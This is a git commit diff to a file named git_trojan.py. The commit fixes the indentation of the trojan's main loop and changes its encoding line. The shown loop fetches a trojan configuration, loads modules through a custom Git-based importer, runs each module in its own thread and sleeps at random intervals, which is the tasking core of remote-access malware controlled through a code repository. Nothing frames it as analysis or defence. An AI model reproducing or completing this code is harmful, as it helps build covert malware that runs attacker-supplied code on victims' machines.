0c570eaa32f096ac61ebac78b8826e0965cf41cd
Admin3675 <545302905@qq.com>
2020-07-01 08:38:24 -0400

    Adding simple config.

--- git_trojan.py
+++ git_trojan.py
@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#  -*- coding: utf-8 -*-
+#coding=utf-8
 
 import json
 import base64
@@ -99,9 +99,9 @@ sys.meta_path = [GitImporter()]
 while True:
     if task_queue.empty():
         config = get_trojan_config()
-    for task in config:
-        t = threading.Thread(target=module_runner,args=(task['module'],))
-        t.start()
-        time.sleep(random.randint(1,10))
+        for task in config:
+            t = threading.Thread(target=module_runner,args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1,10))
 
     time.sleep(random.randint(1000,10000))
